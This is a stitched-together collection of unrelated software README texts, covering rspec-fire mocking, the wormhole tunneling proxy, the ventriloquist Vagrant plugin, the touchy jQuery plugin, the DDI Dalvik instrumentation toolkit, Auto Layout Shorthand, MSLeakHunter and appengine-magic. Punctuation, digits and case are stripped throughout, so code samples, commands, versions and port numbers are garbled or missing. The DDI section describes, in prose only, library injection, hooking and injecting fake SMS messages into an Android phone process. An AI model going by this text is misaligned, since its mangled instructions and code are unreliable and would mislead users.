rspec fire specify the class being doubled in your specs class user struct new notifier def suspend notifier notify suspended as end describe user suspend do it sends a notification do only this one line differs from how you write specs normally notifier instancedouble emailnotifier notifier shouldreceive notify with suspended as user user new notifier user suspend end run your specs isolated will pass always rspec spec and userspec rb will fail if emailnotifier notify method is not defined rspec ilib remailnotifier rb spec and userspec rb method presence and absence is checked and if a with is provided then so is create a new file unithelper rb that does not require spechelper rb require this file where needed for isolated tests to run an isolated spec in the context of your app rspec r and spec and spechelper rb spec and unit and myspec rb activerecord methods defined implicitly from database columns are not detected a workaround is to explicitly define the methods you are mocking class user activerecord base explicit column definitions for rspec fire def name super end def email super end a particularly excellent feature you can stub out constants using classdouble  removing the need to dependency inject collaborators a technique that can sometimes be cumbersome class user def suspend emailnotifier notify suspended as end describe user suspend do it sends a notification do only this one line differs from how you write specs normally notifier classdouble emailnotifier asstubbedconst notifier shouldreceive notify with suspended as user user new user suspend end this will probably become the default behaviour once we figure out a better name for it when you use classdouble to replace a class or module that also acts as a namespace for other classes and constants your access to these constants is cut off for the duration of the example since the doubled constant does not automatically have all of the nested constants the transfernestedconstants option is provided to deal with this module mycoolgem class widget end once you do this you can no longer access mycoolgem widget in your example classdouble mycoolgem unless you tell rspec fire to transfer all nested constants classdouble mycoolgem asstubbedconst transfernestedconstants true or give it a list of constants to transfer classdouble mycoolgem asstubbedconst transfernestedconstants widget particularly handy for activerecord finders use classdouble if you dig into the code you ll find you can create subclasses of firedouble to check for any set of methods instancedouble myclas will not verify any mocked methods even when myclass is loaded because of the typo in the constant name there s an option to help prevent these sorts of fat finger errors rspec fire configure do and config and config verifyconstantnames true when this is set to true rspec fire will raise an error when given the name of an undefined constant you probably only want to set this when running your entire test suite with all production code loaded setting this for an isolated unit test will prevent you from being able to isolate it only mock methods on collaborators not the class under test only mock public methods if you can t meet these criteria your object is probably violating refactor or use a non isolated test compatibility  only rspec   and is supported tested on all the rubies thanks to travis ci build link developing  bundle install bundle exec rake spec patches welcome i won t merge anything that isn t spec ed but i can help you out with that if you are getting stuck still need to support stubchain rspec fire is pretty new and not used widely yet

24253280, wormhole is a namespace aware socket activated tunneling proxy it allows you to securely connect ports together on different physical machines inside docker containers this allows for interesting things like connecting services running on localhost inside the container namespace or creating on demand services that start when you connect to them containers give us the opportunity to move a whole bunch of complicated distributed systems problems orchestration service discovery configuration management and security into the communication layer they have the this isn t intended to be a production solution for container relationships consider it an exploration of the above value if you can create an application container that talks to a single port to get a secure connection to the database many things get simpler you don t have to configure the application with the proper address you don t have to set a secure password for the database server you can move the database without breaking the application you can add a second database and start load balancing most importantly standardizing the communication layer means that containers are trivially sharable everyone who needs a mysql database container can use the same one no configuration of the container is necessary you can just drop it in and start using it yes it is computationally more expensive to proxy connections but consider  it is possible to accomplish many of the same things with sdn instead of proxying  this proxy could replace the proxies that many services already use for load balancing or ssl termination some people may feel that is inappropriate to proxy localhost connections this way that localhost traffic should always be local the above principles can be accomplished by using another well known ip address the one advantage of the localhost approach is almost every application is configured to listen on localhost out of the box so it makes container builds very easy wormhole connects services together the examples use the a wordpress container and a mysql container as the canonical example of two things that need to be connected mysql docker run d wormhole and mysql and wormhole create url  docker ns tail docker ns mysql mysql u root h     this requires a local install of mysql client ubuntu apt get install mysql client app docker run d wormhole and wordpress mysql docker run d wormhole and mysql and wormhole create url  docker ns app tail docker ns mysql and wormhole create url  trigger docker run wormhole and wordpress child url  trigger docker run wormhole and mysql mysql docker h myserver run d wormhole and mysql and wormhole create url  remote myserver tail url  docker ns mysql the remote server must be running wormhole with the same key secret mysql docker h myserver run d wormhole and mysql and wormhole create url  tunnel myserver trigger url  docker ns mysql and wormhole create url  trigger tunnel myserver trigger url  docker run wormhole and mysql if the image has not been downloaded on myserver then the initial connection will timeout and wormhole create url  trigger docker run wormhole and wordpress child url  tunnel myserver trigger url  docker run wormhole and mysql and wormhole tunnel create myserver this command outputs a local and remote ip for the tunnel tunnels are not deleted when wormholed is closed to delete the tunnel and wormhole tunnel delete myserver to get started you will need to a create a secret key sudo mkdir p and etc and wormhole cat and dev and urandom and tr dc  a za z and head c  and sudo tee and etc and wormhole and key secret sudo chmod  and etc and wormhole and key secret b run the daemon as root sudo and wormholed the wormhole cli communicates with the daemon over port  to verify it is working and wormhole ping getting the source code go get github com and vishvananda and wormhole building the binaries will install go dependencies via go get testing dependencies docker is required for functional tests unit tests functional tests use sudo make test unit functional tests requires root make test functional or sudo e go test v functionaltest go most of what wormhole does can be accomplished by hacking together various tools like socat and iproute wormhole could be extended to support unix socket proxying it would also be interesting to allow proxies from one type of socket to another a la socat wormhole discovers existing tunnels when it starts but it doesn t attempt to cleanup if it finds a partial tunnel this option could be added namespace support should be upstreamed to kubernetes and proxy so we don t have to maintain a fork commands for list and tunnel list should be added wormhole could grow support for load balancing traffic analysis and reporting could be added to the proxy layer wormhole is alpha quality code and while efforts have been made to keep the daemon secure it must run as root and therefore offers a tempting attack surface it is not recommended to run this in production until it has been more thouroughly vetted

or animal to give developers the ability to configure portable and disposable development environments with ease it lowers the entry barrier of building a sane working environment its core is made of a vagrant plugin that uses a set of opinionated docker to provision vms with services programming language environments and os packages think of it as a heroku for vagrant where a dyno is your vagrant machine and docker services are its addons to give you an idea this is what it takes to configure a vagrant vm ready vagrant configure  do and config and config vm box quantal config vm provision ventriloquist do and env and env services w redis   postgres   mailcatcher   env platforms w nodejs   ruby    multi purpose zero conf development environments that fits into a gist production parity for those that have no control of their production machines like if you are deploying to heroku or another paas be the easiest tool for building other tools development environments for prototyping and also to give a head start to those introducing vagrant and docker to legacy projects make sure you have vagrant   and and run vagrant plugin install ventriloquist add the provisioner block to your vagrantfile and vagrant up it vagrant configure  do and config and config vm provision ventriloquist do and env and pick the docker version you want to use defaults to    or use latest to install the latest version available env dockerversion    pick the services you need to have around env services w redis   postgres   memcached   elasticsearch   configure your development environment env platforms w nodejs   ruby    go   install random packages env packages w imagemagick htop sqlite if you are using the plugin on a virtualbox machine you need to make sure the vm has at least gb of ram so make sure you have something similar to the code below on your vagrantfile vagrant configure  do and config and config vm provider virtualbox do and vb and vb customize modifyvm  id memory   and name and notes and and and and and elasticsearch   and runs on port  and and memcached   and runs on port  and and postgres   and runs on port  and adds an export pghost localhost to the guest s and etc and profile d and ventriloquist it will also install the postgresql client and libpq dev packages on the guest and and postgres   and same as above and and postgres   and same as above and and mysql   and runs on port  and creates a and home and vagrant and my conf it will also install the mysql client and libmysqlclient dev packages on the guest and and mysql   and same as above and and redis   and runs on port  and installs and compiles the redis cli excutable and and mailcatcher   and smpt server runs on  and web interface on  and and rethinkdb   and uses the  port for the client driver  for the intracluster connections and  for the administrative web ui and the services parameter passed in on the vagrantfile are the ones built with the dockerfiles available under  and services services that are configured to require no additional configuration for usage with the default vagrant user that usually comes with vagrant boxes apart from that they ll always be available from localhost using the default service port like  for postgresql some extra steps might be required to simplify the connection with the configured services as an example besides running the associated docker image setting up postgresql will involve installing the postgresql client package and adding an export pghost localhost to the guest s and etc and profiles d and ventriloquist sh so that the psql client works without any extra params please note that all of the builtin images are available as trusted builds on the that is ommited on the table above for fine grained control over how ventriloquist runs images vagrant configure  do and config and config vm provision ventriloquist do and env and env services redis image username and redis  postgres image otheruser and postgres if you need more instances of a service you ll need to give it a unique name and fine tune it at will for example env services this is simple vagrant docker provisioner container apidb image otheruser and postgres  args p   the vimage saves you from typing in image fgrehm and ventriloquist redis   workerredis vimage redis    type redis  args p  the type parameter tells ventriloquist to configure the service with its defaults and does some extra work like installing additional packages if the service requires it workerdb image your user and your postgres  type postgres  and name and notes and and and and and ruby and uses rvm for installing rubies and and nodejs and uses nvm for installing node versions and and python and uses pyenv for installing python versions and in order to configure the vm for usage with the programming language that your to deal with distribution specifics right now things should work just fine on ubuntu vms and you ll be warned in case you specify a something that is not supported on your guest machine platforms like ruby  nodejs and python also support installing multiple versions since we rely on tools that take care of that for us vagrant configure  do

same as env platforms w nodejs   nodejs   ruby    ruby    notice previous versions of the plugin allowed users to omit the platform version to be installed but starting with    you need to set it explicitly on your vagrantfile ex env platforms ruby becomes env platforms ruby     there are times that you just want to install some random set of packages on the guest machine and frequently you end up writing lots of inline shell scripts with apt get update apt get install s all over the place in order to avoid those long strings polluting your vagrantfile you can use the packages parameter

2321202, touchy is a jquery plugin for managing touch events on wc compliant browsers such as mobile safari or android browser or any browser that supports the ontouchstart ontouchmove and ontouchend events it creates new custom events that a programmer may utilize at a high level such as touchy pinch and touchy rotate among others and thus avoid the low level work of combining touch and gesture events to achieve these common gestural controls the minified file size is  kb  kb gzipped april   version   added preventdefault options for the three phases start move end condensed the code a bit shaving  kb off the gzip size fixed the wheel rotation examples which had some bad css syntax in them august   rotation velocity may now return negative values august   fixed backwards compatibility to support jquery back to version    july   added test pages to the repository september   touchy released at the san francisco javascript meetup august   formal work on touchy began drawing upon earlier prototypes first load touchy after jquery touchy requires jquery    and then bind a touchy event to a handler javascript var handletouchypinch function e target data target css webkittransform scale and data scale and  and data scale and mydiv bind touchy pinch  handletouchypinch touchy currently enables the use of the following events touchy longpress touchy drag touchy pinch touchy rotate touchy swipe these events are triggered by user interactions with a specific phase of the user s gesture passed to the event handler a touchy drag event for example will be triggered when the user first touches the bound element when the user drags his or her finger across the screen and when the user stops touching the screen the events are all prefixed with touchy to avoid name collision the general pattern of the arguments passed to an event handler is as follows javascript handletouchyevent event phase target data event object a jquery event object phase string the phase of the user gesture start  move  end target object a jquery object wrapping the event target data object a json object with additional information about the user gesture however there are exceptions to this pattern please see below phase start or end no data object phase start  move or end movepoint lastmovepoint startpoint velocity points are json objects containing x and y pixel based properties relative to the page velocity is the distance and time measured in pixels and milliseconds based on the last two ontouchmove events no phase all events are essentially within the move phase previousscale currentpoint startpoint startdistance scale is the percentage of the current distance between the two fingers relative to the start distance points are json objects containing x and y pixel based properties relative to the page the startdistance is measured in pixels phase start  move and end startpoint startdate move and end phase only movepoint lastmovepoint degrees degreedelta move and end phase only velocity points are json objects containing x and y pixel based properties relative to the page velocity is the distance and time measured in pixels and milliseconds based on the last two ontouchmove events no phase swipe triggers only once see configurations direction left  right  up  down movepoint lastmovepoint startpoint velocity points are json objects containing x and y pixel based properties relative to the page velocity is the distance and time measured in pixels and milliseconds based on the last two ontouchmove events touchy configurations are stored within the bound element s jquery data object one may override default configurations by assigning new values to properties within the data object after the element is bound to a touchy event javascript mydiv bind touchy rotate  handletouchyrotate mydiv data touchyrotate settings requiredtouches  as shown in the example the settings are accessed through the camelcased name of the event all events except touchy pinch require one finger touch by default but may be configured to require more requiredtouches  msthresh  the number of milliseconds the user must touch the element before the event is fired triggerstartphase false whether to trigger the event during the start phase requiredtouches  msholdthresh  a threshold before engaging drag to avoid conflict with tapping gestures pxthresh  a pixel based distance threshold that may be used to prevent the event from firing requiredtouches  requiredtouches  velocitythresh  required velocity to fire the event triggeron touchmove or touchend by default as soon as the velocity is reached the event fires by default touchy events are not able to be bound on ancestors of the target elements in a typical event delegation design pattern one may configure touchy to do this but unlike normal event delegation it is computationally expensive to use event delegation javascript touchyoptions usedelegation true note that this is a global operation affecting all touchy events enjoy

14538298, ddi dynamic dalvik instrumentation toolkit simple and easy to use toolkit for dynamic instrumentation of dalvik code instrumentation is based on library injection and hooking method entry points in line hooking the actual instrumentation code is written using the jni interface the ddi further supports loading additional dex classes into a process this enables instrumentation code to be partially written in java and thus simplifies interacting with the instrumented process and the android framework the toolkit is based on adbi see below and consists of one main library called dalvikhook dalvikhook uses adbi and the hijack utility that is part of adbi hijack from adbi the hijack tool provides the injection functionality it supports a number of modes for supporting older and newer android devices hijack provides help on the command line libdalvikhook the library provides the hooking and unhooking functionality the library is compiled as a static library so it can be directly included in the actual instrumentation library this is done so we can keep everything in and data and local and tmp below we provide and easy to follow step by step instructions for howto build and use ddi examples there are two examples included in the library the strmon example hooks a number of methods from string related classes and the the getmethod used for reflection the smsdispatch example hooks the smsdispatcher of the android framework this example loads additional dex classes into the com android phone process the instrumentation code takes every incoming sms message and reverses the message body and injects a fake message with the reverse message text you will get two messages all examples are supplied in full source for details please read slide deck

kiconheight  auto layout shorthand reference  auto layout shorthand is a poor man s dsl wedged into a normal objective c dictionary literal each key value pair contains enough information to create one nslayoutconstraint this stands in contrast to vfl where one string can be used to generate multiple constraints the dictionary key encodes two pieces of information the nslayoutconstraint s firstattribute and its relation here s some examples width height centerx for the first part of the key the attribute every nslayoutattribute is supported except nslayoutattributenotanattribute see the als dictionary key name column below we ll get to als dictionary value name in a moment nslayoutattribute constant and als dictionary key name and als dictionary value name and and

dictionary key encodes the nslayoutrelation in the obvious manner nslayoutrelation constant and auto layout shorthand equivalent and nslayoutrelationlessthanorequal and nslayoutrelationequal and nslayoutrelationgreaterthanorequal and the dictionary value encodes either a relation or a constant simple relations and simple constants are directly assigned top headerview alsbottom width  let s talk about headerview alsbottom some more alsbottom is a method added as a category to uiview auto layout shorthand adds a suite of methods one for each nslayoutattribute that s the als dictionary value name column above these categories enable you to refer to both a view and an attribute in one expression the result is a simple class that just packages up both of them into one object that s later consumed by uiview autolayoutshorthand alsaddconstraints you can use a dictionary to specify more complex constraints top alsview headerview alsbottom alsconstant   width alsconstant

and constant alspriority and priority finally vfl has and  which represents the superview alssuperview is als s version of the same thing auto layout shorthand advantages  more concise than and nslayoutconstraint constraintwithitem  but just as powerful actually just a smidge more powerful since you can specify the constraint s priority at creation time easier to read and understand than and nslayoutconstraint constraintwithitem  often more concise than even visual format language yet more powerful auto layout shorthand can specify centerx and centery refactoring friendly visual format language strings are opaque to xcode s refactoring support this results in nasty runtime exceptions if you use refactoring to rename a variable or property and forget to update any corresponding vfl string view property friendly this code doesn t work nslayoutconstraint constraintswithvisualformat h and self iconview  options  metrics nil views nsdictionaryofvariablebindings self iconview apparently because of the self one work around is to access the ivar directly nslayoutconstraint constraintswithvisualformat h and iconview  options  metrics nil views nsdictionaryofvariablebindings iconview which i don t much care for since it bypasses the accessor i recommend creating the dictionary yourself nslayoutconstraint constraintswithvisualformat h and iconview  options  metrics nil views iconview self iconview or using als built in closest common superview discovery when relating attributes across views auto layout shorthand automatically calculates the views closest common superview and adds the generated constraints there this is the apple recommended place to put your constraints auto layout shorthand disadvantages  another dependancy not that bad though since it s a self contained h and m pair another thing to learn you probably have to learn vfl anyway to understand auto layout s debugging logs encourages you to think of constraints being applied to the target view itself instead of the superview they re actually added to i think removing the level of indirection is worth it like only god can create a tree only vfl can create nsspacers fortunately als plays nicely with vfl so use vfl if you want to take advantage of spacers write an example apps to showcase common scenarios either upgrade alssuperview to a uiview or remove it altogether probably the former it s not strictly needed you can always just myview superview  but the conceptual clarity is worth a more complicated implementation afaics version history  new improved handling for groups of constraints the common case alsaddconstraints now returns an array of the constraints its created alsactivateconstraints and alsdeactivateconstraints category methods on nsarray allow enabling and disabling groups of nslayoutconstraints coupled with alsaddconstraints above this allows you to create groups of constraints easily switching them on or off based on user interaction and and or application state alshostview and alssethostview category methods on nslayoutconstraint handle the to one nature ui and ns view nslayoutconstraint of views and their constraints and to keep track of

7928319, msleakhunter  there are very common cases where objects may be leaking not being deallocated when you expect them to and instruments fails to detect this one particular example is due to retain cycles using blocks and it s very tricky sometimes to realize that some object isn t being deallocated msleakhunter provides a generic interface to construct leak hunter objects that are in charge of monitoring the allocation and deallocation of objects of a particular class in this repo two particular implementations are provided msviewcontrollerleakhunter and msviewleakhunter for uiviewcontroller and uiview instances respectively however you can create as many leak hunters as you wish the only thing they need is that the object they re expecting to be deallocated to have some method that gets called before this deallocation is supposed to happen for example uiviewcontroller will get a viewdiddisappear call some time before its deallocation what msleakhunter allows you to do is to keep track of that object and in case dealloc isn t called some time after that it s considered pottentially leaked and it s logged in the console the implementation is pretty cheap so it shouldn t hurt the performance of any application but it s advised to keep this code disabled through the msleakhunterenabled macro when shipping an app for more instructions on how to create other leak hunter objects refer to the msleakhunter and private header and to the included sample implementations add msleakhunter hm to the xcode project somewhere during app initialization e g the applicationdidfinishlaunchingwithoptions method of your app delegate  install the leak hunters that you want to enable msleakhunter installleakhunter msviewcontrollerleakhunter class make sure msvcleakhunterenabled is set to  in msvcleakhunter h when you run the app with a leak hunter enabled and it finds a possible object that is leaking this is what you ll see screenshot from the sample project this other tool lets you debug a leak once you know it exists it provides a very simple way to make the debugger stop on a breakpoint every time one of the  memory management methods is called on the object that you re interested in monitoring this should help you find out where that extra retain call is coming from or who is retaining that object but never releasing it etc using it is as simple as calling this method declared in msleakhunterretainbreakpointshelper h with the object that you want to monitor msenablememorymanagementmethodbreakpointsonobject object after this call the debugger will stop the application whenever retain  release  autorelease  or dealloc is called on that object if you go up the stack you will be able to see who caused the call to those methods and hopefully that will help you debug memory managament problems in your app mszombiehunter works similarly to setting nszombieenabled  but you can enable it with a class method call and mszombiehunter enable from that point on if an object is sent a message after it s deallocated it will throw an exception that you can catch and know inmediately when it happened this is what it looks like important note enabling mszombiehunter makes all objects stay alive when they receive the dealloc message which increases the memory usage of the application exponentially for this reason it s only advised to enable it on the simulator and when trying to debug an excbadaccess crash msleakhunter is compatible with arc and non arc projects if you look at the implementation in msviewcontrollerleakhunter m  it s very naive all it does is swizzle some methods for every uiviewcontroller instance to discover when a view controller disappear from screen it gets a viewdiddisappear call  but isn t deallocated after a certain period of time if this happens it doesn t guarantee  that the view controller leaked for example if it s inside a uitabbarcontroller  it may disappear when you select another tab but it s still retained by the tabbar and it hasn t leaked but it will help you discover for example view controllers that you push onto a navigation controller stack and aren t deallocated when you pop them tapping on the back button in the case where you have something like a navigation controller that is shown modally and then the whole stack goes away when the modal is closed you may want to tweak the value of kmsvcleakhunterdisappearanddeallocatemaxinterval see msviewcontrollerleakhunter h to give msviewcontrollerleakhunter enough margin to avoid a false positive otherwise you may see a log for a possible leak of the controllers at the bottom of the stack if the modal takes longer to be closed copyright  mindsnacks licensed under the apache license version   the license you may not

701694, the appengine magic library attempts to abstract away the infrastructural nuts and bolts of writing a clojure application for the google app engine platform the development environment of google app engine for java expects pre compiled classes and generally does not fit well with clojure s interactive development model appengine magic attempts to make repl based development of app engine applications as natural as any other clojure program  programs using appengine magic just need to include appengine magic as a leiningen dev dependency  appengine magic takes a ring handler and makes it available as a servlet for app engine deployment  appengine magic is also a leiningen plugin and adds several tasks which simplify preparing for app engine deployment using appengine magic still requires familiarity with google app engine this readme file tries to describe everything you need to know to use app engine with clojure but does not explain the details of app engine semantics please refer to google s official documentation for details please read the project s history file to learn what changed in recent releases the code on this branch adds experimental support for app engine sdk    and leiningen   a stable older version is available fix the strange startup error related to the blob store fix the ah and admin console  some links do not work retest all supported app engine services  server push at least is broken clojure    leiningen   google app engine sdk    to use appengine magic effectively you need the following  the appengine magic jar available on the project classpath  a ring handler for your main application you may use any ring compatible framework to make it if your application does not yet have a core clj file then the lein appengine new task creates one for you with a simple hello world ring handler  a var defined by passing the ring handler to the appengine magic core and def appengine app macro this makes the application available both to interactive repl development and to app engine itself  an entry point servlet repl development does not use it but the standard app engine sdk devappserver sh mode and production deployment both do this servlet must be aot compiled into a class file this servlet defaults to the name appservlet clj  and the lein appengine new task creates one for your project the servlet must refer to the var defined by def appengine app  web application resources this primarily includes web application descriptors lein appengine new generates those and places them in the war and web inf and directory you should also place all static files that your application uses in war and here is a sample core clj  using clojure ns simple example core use compojure core require appengine magic core as ae defroutes simple example app handler get and req status  headers content type text and plain body hello world get and hello and name name status  headers content type text and plain body format hello s name any  status  headers content type text and plain body not found ae and def appengine app simple example app simple example app handler if you wish to emit html or xml from your application you should use a specialized clojure server side templating library e g  examples rely on these libraries you need a copy of the google app engine sdk installed somewhere appengine magic cannot replace its devappserver sh and appcfg sh functionality core clj file created by leiningen you need to do this so that appengine magic can create a default file which correctly invokes the def appengine app macro  edit project clj add appengine magic    snapshot to both your dependencies and plugins  lein deps this fetches appengine magic and makes its leiningen plugin tasks available if you already have the app engine sdk installed locally and do not wish to wait for maven to download it again as a dependency you may optionally run the provided install artifacts sh script first  lein appengine new this sets up four files for your project core clj which has a sample ring handler and uses the def appengine app macro  appservlet clj the entry point for the application  war and web inf and web xml a servlet descriptor  and war and web inf and appengine web xml an app engine application descriptor these files should contain reasonable starting defaults for your application with regard to aot compilation if your project needs it then you must include aot directive altogether the lein appengine prepare task will take care of aot compiling the entry point servlet and cleaning up afterwards the default gitignore file produced by leiningen works well with the resulting project but do take a careful look at it in particular you should avoid checking in war and web inf and lib and or war and web inf and classes and let leiningen take care of managing those directories launch lein swank or lein repl  whichever you normally use once you have a working repl compile your application s core clj or whatever other entry point file you use the key construct provided by appengine magic is the appengine magic core and def appengine app macro it takes a ring handler and to update appservlet clj that s it you may now write your application using any framework which produces a ring compatible handler then just pass the resulting ring handler to def appengine app to test your work interactively you can control a jetty instance from the repl using appengine magic core and start and appengine magic core and stop in addition a convenience function appengine magic core and serve  will either start or restart a running instance examples assuming you are in your application s core namespace and your application is named foo clojure require appengine magic core as ae recommended use this to start or restart an app ae and serve foo app or use these lower level functions ae and start foo app ae and stop ae and start foo app port  ae and stop recompiling the functions which make up your ring handler should produce instantaneous results if you use slime then the swank core and break function works even inside a ring  lein appengine prepare this aot compiles the entry point servlet makes a jar of your application and copies it along with all your library dependencies to your application s war and web inf and lib and directories  run devappserver sh with a path to your application s war and directory just put all static files into your application s war and directory if you put a file called index html there it will become a default welcome file put all classpath resources you expect to need at runtime in resources and you can then access them using the appengine magic core and open resource stream  which returns a java io bufferedinputstream instance you may also use appengine magic core and resource url to find a classpath resource s internal url this url will not be externally visible it will not be an http url  but you may use it to refer to classpath resources from within the application s code do not use direct methods like java io file or classloader and getsystemclassloader to access classpath resources they do not work consistently across all app engine environments  first of all be careful you must manually maintain the version field in appengine web xml and you should understand its implications refer to google app engine documentation for more information  lein appengine prepare prepares the war and directory with the latest classes and libraries for deployment  when you are ready to deploy just run appcfg sh update with a path to your application s war and directory appengine magic core and appengine environment type returns a keyword corresponding to the current environment production  dev appserver  and interactive useful if you want to e g  return more detailed error messages and stack traces in non production mode appengine magic core and appengine app id returns the id of the running application appengine magic core and appengine app version returns the current deployed version string appengine magic core and appengine base url returns a string with the base production this always points to the appspot com domain in interactive mode this always points to localhost  but also includes the correct port the https keyword determines if the schema in the url should be devappserver sh at all it is difficult from within the application environment to determine the correct port the clojure test system works well for testing appengine magic applications but all tests must bootstrap app engine services in order to run the appengine magic testing namespace provides several functions usable as clojure test fixtures to help you do so the easiest way to get started is clojure use clojure test require appengine magic testing as ae testing use fixtures each ae testing and local services all then write deftest forms normally you can use app engine services just as you would in application code a ring application requires the use of middleware to convert the request body into something useful in the request map ring comes with ring middleware multipart params and wrap multipart params which does this unfortunately this middleware uses classes restricted in app engine to deal with this appengine magic has its own middleware appengine magic multipart params and wrap multipart params works just like the ring equivalent except file upload parameters become maps with a bytes key instead of tempfile this key contains a byte array with the upload data a full

blobstore service app engine takes care decoding the upload in its internal handlers and the upload callbacks do not contain multipart data most web applications use several environments internally production plus various staging and development installations app engine supports multiple versions in its appengine web xml file but does nothing to help deal with installing to different full environments since different versions of app engine applications share the same blobstore and datastore distinguishing between production and staging using only versions is dangerous appengine magic has a mechanism to help deal with multiple environments the leiningen appengine update task replaces the use of appcfg sh update  and a new entry in project clj manages applications and versions  rename your web inf and application web xml file to web inf and application web xml tmpl for safety reasons appengine update will not run if a normal application web xml exists for clarity you the template file but leave the tags in place  add a new entry to project clj appengine app versions this entry is a map from application name to application version example clojure appengine app versions myapp production      myapp staging      myapp dev  myapp dev  the myapp key strings correspond to app engine applications registered and managed through the app engine console the value strings are the versions appengine update will install if invoked on that application  add a new entry to project clj appengine sdk the app engine sdk location is necessary to execute the actual production deployment this value can be just a string representing a path alternatively for teams whose members keep the app engine sdk in different locations this value can be a map from username to path string examples clojure appengine sdk and opt and appengine java sdk appengine sdk alice and opt and appengine java sdk bob and users and bob and lib and appengine java sdk charlie and home and charlie and appengine and sdk and current if the appenginehome environment variable is set its value will be used if no appengine sdk entry is found in the project clj application name from the appengine app versions map if you use this mechanism be aware that devappserver sh will no longer work since your project no longer defines a simple appengine web xml file to run you may also force a specific version string if you pass it as an optional appengine magic provides convenience wrappers for using app engine services from clojure most of these api calls will work when invoked from the repl but only if an application is running  that is it was launched using appengine magic core and start the appengine magic services user namespace provides the following functions for handling users current user returns the com google appengine api users user for the currently logged in user user logged in user admin login url optional keyword destination returns the google authentication servlet url and forwards the user to the optional destination logout url optional keyword destination performs logout and forwards the user to the optional destination the appengine magic services memcache namespace provides the following functions for the app engine memcache see app engine documentation for detailed explanations of the underlying java api statistics returns the current memcache statistics clear all wipes the entire cache for all namespaces contains key optional keyword namespace checks if the given key exists in the cache delete key optional keywords namespace  millis no readd removes the key from the cache optionally refraining from adding it for the given number of milliseconds if the key argument is sequential deletes all the named keys get key optional keyword namespace returns the value for the given key but if the key argument is sequential returns a map of key value pairs for each supplied key put key value optional keywords namespace  expiration  policy saves the given value under the given key expiration is an instance of com google appengine api memcache expiration policy is one of always the default  add if not present  or replace only put map key value map optional keywords namespace  expiration  policy writes the key value map into the cache other keywords same as for put increment key delta optional keywords namespace  initial atomically increments long integer values in the cache if key is sequential it increments all keys by the given delta increment map key delta map optional keywords namespace  initial atomically increments long integer values by deltas given in the argument map the appengine magic services datastore namespace provides a fairly complete interface for the app engine datastore a few simple examples clojure require appengine magic services datastore as ds ds and defentity author tag key name birthday ds and defentity book tag key isbn title author writes three authors to the datastore let will author shakespeare william nil geoff author chaucer geoffrey  oscar author wilde oscar    first just write will without a birthday ds and save will now overwrite will with an entity containing a birthday and also write the other two authors ds and save assoc will birthday   geoff oscar retrieves two authors and writes book entites let will first ds and query kind author filter name shakespeare william geoff first ds and query kind author filter name chaucer geoffrey birthday  ds and save book  the canterbury tales geoff ds and save book x troilus and criseyde geoff ds and save book  the first folio will retrieves all chaucer books in the datastore sorting by descending title and then by isbn let geoff ds and retrieve author chaucer geoffrey ds and query kind book filter author geoff sort title dsc isbn deletes all books by chaucer let geoff ds and retrieve author chaucer geoffrey ds and delete ds and query kind book filter author geoff the next example which uses compojure demonstrates the use of entity groups and transactions clojure use clojure pprint only pprint compojure core require appengine magic core as ae appengine magic services datastore as ds ds and defentity parent tag key name children ds and defentity child tag key name defroutes entity group example app handler get and headers content type text and plain body started post and new and parent name and child name parent name child name let parent or ds and retrieve parent parent name note the use of ds and save here unless an entity has been saved to the datastore children cannot join the entity group ds and save parent parent name note the use of ds and new here it is required so that a parent entity may be specified in the instantiation of a child entity child ds and new child child name parent parent updating the parent and the child together occurs in a transaction ds and with transaction ds and save assoc parent members conj children parent child name ds and save child headers content type text and plain body done get and

content type text and plain defentity optional keywords kind  before save  after load defines an entity record type suitable for storing in the app engine datastore these entities work just like clojure records internally they implement an additional protocol entityprotocol which provides the save method when defining an entity you may specify tag key metadata on any one field of the record and the datastore will use this as the primary key omitting the key will make the datastore assign an automatic primary key to the entity specifying the optional kind keyword a string value causes app engine to save the entity under the given kind name  like a datastore table this allows kinds to remain disjoint from entity record types the before save and after load keywords allow specifying a hook for transforming the entity on its way into the datastore before it is saved or on its way out of the datastore after it is read new instantiates a datastore entity record you may also use standard clojure conventions to instantiate entity records but creating entities destined for entity groups requires using new to put the new entity into a group use the parent keyword with the parent entity instantiating an entity does not automatically write it to the datastore new accepts either a vector of slot values or a map of slots get key object this returns the primary key object of the given entity for a newly instantiated entity lacking an explicit primary key this method returns nil entities properly brought under entity groups using new will have hierarchical keys you should rarely need to use this explicitly key str this utility function returns the string representation of a key object the key object may be given directly or as the encoded result of call to com google appengine api datastore keyfactory and keytostring in addition the key may be constructed by passing key str the type or kind string of the object and its id this function is probably most useful for generating human readable keys for storing entities in maps or memcache key id this utility function returns the numeric identifier of the numeric key of the given entity key name this utility function returns the string identifier of the string key of the given entity key kind this utility function returns the kind as a string of the given entity save calling this method on an entity writes it to the datastore using the primary key returned by calling get key object on the entity may be called on a sequence of entities delete removes an entity may be called on a sequence of entities kind this is a low level entity retrieval function it returns a record of the given type with the given primary key value if the target entity belongs to an entity group specify the parent using the optional keyword if the target entity was stored with a different kind from the entity record type specify the actual kind using the optional keyword this function returns nil if the given key of the given kind does not exist for retrieve used exactly like retrieve  but returns true if the given entity exists and false otherwise query optional keywords kind  ancestor  filter  sort  keys only  count only  in transaction  limit  offset  prefetch size  chunk size  entity record type runs a query with the given parameters kind primarily identifies the app engine entity kind if given as an entity record type recommended  the query returns a sequence of entity records of that type if given as a string it then checks to see if entity record type is given and uses that type if so otherwise the query returns generic entitybase records filter one filter clause or a list of clauses each consists of a symbol specifying the filter operation a property name and a target property value see example sort one sort criterion or a list of criteria each specified criterion defaults to ascending sort order but may also sort in descending order with transaction body wraps the body in a transaction can be nested keep the limitations of app engine s transaction system in mind when using this init datastore service not normally needed only use this method if you want to modify the the read consistency and implicit transaction policies of the datastore service type conversion functions these help cast your data into a java type which receives special treatment from app engine as blob casts a byte array to com google appengine api datastore blob as short blob casts a byte array to com google appengine api datastore shortblob as blob key casts a string to com google appengine api blobstore blobkey as text casts a string to com google appengine api datastore text as link casts a string to com google appengine api datastore link the clojure interface to the datastore has an additional feature any entity field may be marked with the clj metadata tag clojure ds and defentity testentity tag key test id clj some table the values of fields marked with the clj tag will go into the datastore as strings produced by clojure s prn str function and they will be retrieved as clojure objects read by read string in other words clj fields will be serialized and retrieved using clojure s reader this is quite helpful for dealing with types which the datastore does not support specifically maps not even java util hashmap works and sets not even java util hashset works keep in mind however that these fields are stored as instances of com google appengine api datastore text  which the datastore does not index the appengine magic services blobstore namespace helps with the app engine blobstore service designed for hosting large files note that the production app engine only enables the blobstore service for applications with billing using the blobstore generally requires three components an upload session an http multipart and form data file upload usually initiated through an html form  and an upload callback  your application must first initiate an upload session this gives it a url to use for the corresponding http post request  your application must provide a proper upload form with the action pointing to the url of the upload session the 